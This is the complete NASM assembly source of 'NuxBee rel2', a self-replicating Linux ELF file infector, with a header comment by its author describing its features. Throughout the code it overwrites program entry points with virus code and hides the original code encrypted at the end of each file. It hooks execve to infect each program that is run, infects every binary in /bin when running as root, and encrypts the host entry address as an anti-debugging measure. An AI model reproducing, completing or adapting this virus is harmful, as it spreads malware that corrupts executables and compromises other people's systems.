;
; NuxBee rel2
; Coded by Bumblebee
;
; That's my 1st ELF infector released so don't keen on me :)
; Unix systems are as good as other environment to code a virus. We know
; the main problem is the spread, quite impossible. Well... we are here
; just for fun, so let's go and show what can be done in assembler.
; Let's go to the next frontier.
;
; Some features:
;
;  . Infection method it's 'not strip resistant', uh :/
;  . It's per-process resident by patching PLT entry for 'execve' at
;    run-time (if available).
;  . Uses some features common under win32 viruses such as: memory mapped
;    files, CRC32 instead of strigz for hooks, ...
;  . Direct action aganist /bin folder if euid is 0 (the idea is to
;    infect as much shells as possible).
;  . It doesn't changes the headers at all. Uses mprotect syscall to change
;    the page where virus stands to be writable and restore host code. It 
;    just looks for host EP and puts virus code there. The original code is 
;    stored (encrypted) at the end of file. For correct execution of the host
;    the virus must locate the host file (looking local folder and PATH
;    folders), load that code, decrypt it and restore the host in memory.
;    Then it can jmp host ep to run host it.
;  . Anti-debug features: encrypts host ep addr with CRC32 of virus code at
;    infection time, and decrypts calculating CRC32 again at run-time.
;  . Coded using NASM syntax.
;
; What's new?
;
;  . Lil' bug inside '/bin' infection fixed.
;
;   DEV SYSTEM: Mandrake 7.1 (Kernel 2.2.16) partial test
;  TEST SYSTEM: Mandrake 6.1 (Kernel 2.2.11) full test
;
; the way of the bee
;

; include with some equs
%include"linux.inc"

bits 32
section .data

	msg	db	0xa,"NuxBee by Bumblebee activated.",0xa
		db	"Have a nice day!",0xa
	len	equ	$-msg

	strz	db	'execve',0

section .text

	global _start

_start:
	; setup fake 1st gen
	push	dword fakeHost
	pusha
        mov     ebx,_start
        and     ebx,0fffff000h
        mov     ecx,2000h
        mov     edx,7h
	mov	eax,_mprotect
        int     0x80

	push	dword 7
	push	dword strz
	call	CRC32
	mov	[funcHook],eax

	call	getDelta
	jmp	directAction
inicio:
	pusha

	call	getDelta			; get delta offset

	; get heap
	push	dword 0				; offset 0
	push	dword -1			; file hnd none
	push	dword 22h			; map_private and map_anonymous
	push	dword 7				; read|write|exec
	push	dword (vfinal-inicio)		; heap size
	push	dword 0				; null
	mov	ebx,esp
	mov	eax,_mmap			; map mem
	int	0x80
	add	esp,6*4

	mov	edi,eax				; copy virus there
	lea	esi,[inicio+ebp]
	mov	ecx,(final-inicio)
	rep	movsb

	; goto mem copy
	add	eax,inMemory-inicio
	jmp	eax
inMemory:
	call	getDelta			; get delta again

	lea	eax,[inicio+ebp]
	push	dword (final-inicio)
	push	eax
	call	CRC32
	xor	[esp+20h],eax			; decrypt host EP

        mov     ebx,[esp+20h]			; get host page
        and     ebx,0fffff000h
        mov     ecx,2000h			; change 2 pages
        mov     edx,7h
	mov	eax,_mprotect			; change protections
        int     0x80

	mov	ebx,[esp+28h]			; try to open host

	xor	ecx,ecx
	mov	eax,_open
	int	0x80
	dec	eax
	jns	openHostOk
	jmp	tryPath				; if fails, try searching
openHostOk:					; into PATH env variable
	inc	eax
	mov	ebx,eax
	mov	edx,2
	mov	ecx,-((final-inicio)+5)
	mov	eax,_lseek
	int	0x80				; goto eof - vsize

	mov	ecx,[esp+20h]			; restore host
	push	ecx
	mov	edx,(final-inicio)+5
	mov	eax,_read
	int	0x80

	mov	eax,_close
	int	0x80

	pop	esi				; decrypt host code
	mov	eax,esi
	mov	ecx,((final-inicio)+5)/4
decHostCode:
	xor	[esi],eax
	rol	eax,1
	add	esi,4
	loop	decHostCode

hostRestored:
	mov	ebx,[pltAddr+ebp]		; get plt calculated at
						; infection time
	or	ebx,ebx
	jz	directAction

	mov	ebx,[ebx+2]
        and     ebx,0fffff000h
        mov     ecx,2000h			; change 2 pages
        mov     edx,7h
	mov	eax,_mprotect			; change protections
        int     0x80

	mov	esi,[pltAddr+ebp]		; get plt again
	mov	[nhook+ebp],esi			; save addr
	mov	esi,[esi+2]
	lea	eax,[hook+ebp]
	xchg	eax,[esi]			; hook!
	mov	[ohook+ebp],eax			; save old value

directAction:

	mov	eax,_geteuid
	int	0x80				; get euid
	or	eax,eax
	jz	scanBinFolder			; bah!
	jmp	jmpHost

scanBinFolder:
	; now it's the moment to penetrate the system
	; probably we've waited long time, so infect all
	; /bin folder to be sure we touch a shell

	xor	eax,eax
	push	eax
	mov	eax,~'/bin'
	not	eax
	push	eax
	xor	ecx,ecx
	mov	ebx,esp
	mov	eax,_open
	int	0x80				; open the folder
	add	esp,8				; quit string from stack

	dec	eax
	js	jmpHost				; what da fuck?!?
	inc	eax
	push	eax				; save handle

	mov	ebx,eax				; dir handle
	lea	ecx,[buffer+ebp+1000h]
	push	ecx				; buffer + 1000h
	mov	edx,1000h			; 4 kbs
	mov	eax,_getdents
	int	0x80				; get directory entries
	pop	esi

	dec	eax
	js	closeTheFolder			; uh?
	inc	eax

	mov	edx,eax				; save limit
	xor	ecx,ecx
infectFolderLoop:
	lea	edi,[esi+ecx+0ah]		; get filename
	cmp	byte [edi],'.'			; skip shit
	je	nextDirEnt

	push	esi				; build the string
	lea	esi,[strBuff+ebp]		; build '/bin/'
	mov	dword [esi],~'/bin'
	not	dword [esi]
	mov	byte [esi+4],'/'
	add	esi,5
	xchg	esi,edi
strBuildLoop:
	movsb					; copy filename
	cmp	byte [esi-1],0
	jne	strBuildLoop
	pop	esi

	lea	ebx,[strBuff+ebp]		; put filename into ebx
	call	infect				; huehahaha

nextDirEnt:
	sub	dx,[esi+ecx+8]			; sub this one
	add	cx,[esi+ecx+8]			; goto next one
	or	edx,edx
	jnz	infectFolderLoop

closeTheFolder:
	pop	ebx
	mov	eax,_close
	int	0x80				; close the folder

jmpHost:
	popa					; go back host
	ret

	; if not in current directory just look for the host
	; in folders listed into PATH env variable
tryPath:
	mov	edi,esp				; get env **
	add	edi,28h
	mov	eax,[esp+24h]
	inc	eax
	mov	cx,4
	mul	cx
	add	edi,eax
	mov	esi,[edi]
	jmp	pathLoop

pathLoop0:					; look for 'PATH='
	add	edi,4
	mov	esi,[edi]
pathLoop:
	mov	eax,~'PATH'
	not	eax
	cmp	dword [esi],eax
	jne	pathLoop0

	cmp	byte [esi+4],'='
	jne	pathLoop0

	add	esi,5				; now look for the host
getPathLoop0:					; folder
	xor	edx,edx
	lea	edi,[buffer+ebp]
getPathLoop:
	movsb

	cmp	byte [esi-1],'\'
	je	getPathLoop
	cmp	byte [edi-1],':'		; end of PATH?
	je	checkThis	
	cmp	byte [edi-1],0			; last PATH?
	je	checkThis
	jmp	getPathLoop

checkThis:					; append /<host filename>
	dec	edi				; or just try to open
	or	edx,edx				; if already added
	jnz	tryOpenNow
	push	esi				; save search pointer
	mov	al,'/'
	stosb
	mov	esi,[esp+2ch]
	inc	edx
	jmp	getPathLoop

tryOpenNow:
	pop	esi				; restore the pointer
						; of PATH search (may be
						; that's not the folder)
	lea	ebx,[buffer+ebp]
	xor	ecx,ecx
	mov	eax,_open
	int	0x80				; you're there?!
	dec	eax
	js	getPathLoop0			; try next path entry
	jmp	openHostOk			; yeah :)

; uh? what does this routine? ;)
infect:
	pusha
	mov	ecx,2
	mov	eax,_open
	int	0x80				; open the file to infect
	dec	eax
	jns	openOk
	jmp	infError
openOk:
	inc	eax
	mov	[fHnd+ebp],eax			; save file handle
	mov	ebx,eax

	xor	ecx,ecx
	mov	edx,2
	mov	eax,_lseek
	int	0x80				; goto eof and get file size
	mov	[fileSize+ebp],eax		; save file size

	push	dword 0				; offset 0
	push	ebx				; file hnd
	push	dword 1				; map_private
	push	dword 3				; read|write
	push	eax				; file size
	push	dword 0				; null
	mov	ebx,esp
	mov	eax,_mmap			; map file
	int	0x80
	add	esp,6*4

	dec	eax
	jns	mapOk
	jmp	infErrorClose
mapOk:
	inc	eax
	mov	[ebp+mMap],eax
	mov	edx,eax

	mov	ax,[edx+2]
	sub	al,ah
	cmp	al,'L'-'F'			; check it's ELF
	jne	infErrorCloseUmap

	cmp	word [edx+10h],2		; executable file?
	jne	infErrorCloseUmap

	cmp	word [edx+12h],3		; check machine type
	je	i386ok
	cmp	word [edx+12h],6
	jne	infErrorCloseUmap
i386ok:
	jmp	checksOk			; file is nice to infect

infErrorCloseUmap:
	mov	ecx,[fileSize+ebp]
	mov	ebx,[mMap+ebp]
	mov	eax,_munmap
	int	0x80

infErrorClose:
	mov	ebx,[fHnd+ebp]
	mov	eax,_close
	int	0x80
infError:
	popa
	ret

	; checks are done: now just infect the file
checksOk:

	; look for our segment
	mov	esi,[edx+1ch]
	add	esi,edx

	movzx	edi,word [edx+2ch]		; get entry count
readNextEntry:
	mov	eax,[esi+8h]			; look for ep segment
	cmp	eax,[edx+18h]			; and check has enought
	ja	moreEntries			; size for virus body
	add	eax,[esi+10h]
	cmp	eax,[edx+18h]
	jb	moreEntries
	sub	eax,[edx+18h]
	cmp	eax,(final-inicio)+5
	ja	segFound
	jmp	infErrorCloseUmap
moreEntries:
	add	esi,20h
	dec	di
	jnz	readNextEntry

	jmp	infErrorCloseUmap

segFound:
	mov	edi,[edx+18h]			; calc file addr of ep
	sub	edi,[esi+8h]
	add	edi,[esi+4h]
	add	edi,edx

	cmp	byte [edi+5],60h		; pusha?
	jne	notInfected
	jmp	infErrorCloseUmap
notInfected:
	mov	esi,edi

	lea	edi,[buffer+ebp]

	push	esi				; get host code
	mov	ecx,(final-inicio)+5
	rep	movsb
	pop	esi

	lea	edi,[ebp+inicio]

	xchg	esi,edi

	mov	al,68h
	stosb

	; now look for got addr for the desired func to hook
	; i calc this stuff right now for simplicity
	; notice this step is not as easy as at win32 platforms
	; due two points:
	; 1. we cannot know where the hell are the addr fot the funcs
	; 2. most likely the dynamic linker will fill import address alike
	;    structures when needed, not at loading time
	;
	; So i look for plt addr of 'execve' at infection time, to make
	; the hook later, at runtime.
	;
	pusha

	xor	eax,eax
	mov	[shs+ebp],eax
	mov	[shs+ebp+4],eax
	mov	[pltAddr+ebp],eax		; init to 0

	mov	esi,[edx+20h]			; section header
	add	esi,edx
	movzx	edi,word [edx+34h]		; get entry count
readNextShEntry:

	cmp	[esi+4],dword 11		; DYNSYM?
	je	shFound0

	cmp	[esi+4],dword 3			; STRTAB?
	je	shFound1

moreShEntries:
	add	esi,28h
	dec	di
	jnz	readNextShEntry

	jmp	noHook

shFound0:
	mov	[shs+ebp],esi			; store DYNSYM addr
	mov	eax,[shs+ebp+4]
	jmp	isShDone
shFound1:
	mov	[shs+ebp+4],esi			; store STRTAB
	mov	eax,[shs+ebp]
isShDone:
	or	eax,eax
	jz	moreShEntries
shOk:
	mov	esi,[shs+ebp]			; DYNSYM
	mov	edi,[shs+ebp+4]			; STRTAB
	mov	ecx,[esi+14h]			; section size
	mov	ebx,[esi+24h]			; entry size
	mov	esi,[esi+10h]
	add	esi,edx				; goto 1st entry
	mov	edi,[edi+10h]
	add	edi,edx				; begin of table

enumFuncsLoop:					; look for the func
	push	esi
	mov	esi,[esi]			; get index into table
	add	esi,edi				; get string

	push	dword 7
	push	esi
	call	CRC32				; check func name
	sub	eax,12345678h
funcHook	equ $-4
	jz	funcFound

	pop	esi
	add	esi,ebx				; if not found check
	sub	ecx,ebx				; next
	jnz	enumFuncsLoop

	jmp	noHook
funcFound:
	pop	esi

	mov	eax,[esi+4]
	mov	[pltAddr+ebp],eax		; save its virt addr!
noHook:
	popa

	push	dword (final-inicio)
	lea	eax,[inicio+ebp]
	push	eax
	call	CRC32				; calc CRC32

	mov	ecx,eax
	mov	eax,[edx+18h]			; encrypt host ep
	xor	eax,ecx
	stosd					; save host ep
	xor	eax,ecx				; restore host ep

	mov	ecx,(final-inicio)
	rep	movsb				; put virus body

	lea	esi,[buffer+ebp]		; encrypt host code
	mov	ecx,((final-inicio)+5)/4
encHostCode:
	xor	[esi],eax			; eax has host ep
	rol	eax,1
	add	esi,4
	loop	encHostCode
	
	mov	ecx,[fileSize+ebp]		; get file size

	mov	edx,4
	mov	ebx,[mMap+ebp]
	mov	eax,_msync
	int	0x80				; flush changes to disk

	mov	eax,_munmap
	int	0x80				; unmap mem addr

	mov	edx,2
	xor	ecx,ecx
	mov	ebx,[fHnd+ebp]
	mov	eax,_lseek
	int	0x80				; goto eof

	mov	edx,(final-inicio)+5
	lea	ecx,[buffer+ebp]
	mov	eax,_write
	int	0x80				; save host code

	jmp	infErrorClose

getDelta:
	call	delta
copyright	db	0xa,"NuxBee by Bumblebee - The NeXt Frontier",0xa
delta:
	pop	ebp
	sub	ebp,copyright			; calc delta offset
	ret
;
; That routine is the same than in win32 systems :)
;
CRC32:
        push    ebp
        mov     ebp,esp
        push    esi
	push	edi
	push	ecx
	push	edx
	push	ebx

        mov     esi,dword [ebp+8]
        mov     edi,dword [ebp+12]

	cld
        xor     ecx,ecx
        dec     ecx
	mov     edx,ecx
	push    ebx
NextByteCRC:
	xor     eax,eax
	xor     ebx,ebx
	lodsb
	xor     al,cl
	mov     cl,ch
	mov     ch,dl
	mov     dl,dh
	mov     dh,8
NextBitCRC:
	shr     bx,1
	rcr     ax,1
	jnc     NoCRC
	xor     ax,08320h
	xor     bx,0EDB8h
NoCRC:
        dec     dh
	jnz     NextBitCRC
	xor     ecx,eax
	xor     edx,ebx
        dec     edi
	jnz     NextByteCRC
	pop     ebx
	not     edx
	not     ecx
	mov     eax,edx
	rol     eax,16
	mov     ax,cx
        pop     ebx 
	pop	edx 
	pop	ecx 
	pop	edi 
	pop	esi
        pop     ebp
        retn    8

; that's our execve hook. notice we must return in case the execve call
; fails. if all goes nice, there is no return hehehe
hook:
	push	eax
	pusha
	call	getDelta

	mov	ebx,[esp+28h]
	call	infect				; infect it

	mov	esi,[nhook+ebp]			; get plt addr
	mov	[esp+20h],esi			; setup call addr

	mov	esi,[esi+2]
	mov	eax,[ohook+ebp]
	mov	[esi],eax			; restore func

	lea	eax,[hookRetAddr+ebp]
	xchg	[esp+24h],eax
	mov	[oldRetAddr+ebp],eax		; change ret addr

	popa
	pop	eax
	jmp	eax				; call func
hookRetAddr:
	pusha

	call	getDelta
	
	mov	eax,[oldRetAddr+ebp]
	mov	[esp+20h],eax			; restore ret addr

	mov	esi,[nhook+ebp]			; restore hook
	mov	esi,[esi+2]
	mov	eax,[ohook+ebp]

	cmp	[esi],eax			; check ld workz
	je	hookIsOk
	mov	eax,[esi]
	mov	[ohook+ebp],eax			; update hook
hookIsOk:
	lea	eax,[hook+ebp]
	mov	[esi],eax

	popa					; go back host
	ret

pltAddr		dd	0

; here begins virtual data of the virus
final:

fileSize	dd	0
fHnd		dd	0
mMap		dd	0

shs		dd	0,0
nhook		dd	0
ohook		dd	0
oldRetAddr	dd	0

strBuff		times	256 db 0

buffer		times	2000h db 0
vfinal:

	; a fake host for 1st gen, just shows a message and exits
fakeHost:
	mov	edx,len
	mov	ecx,msg
	mov	ebx,1
	mov	eax,_write
	int	0x80

	mov	ebx,0
	mov	eax,_exit
	int	0x80
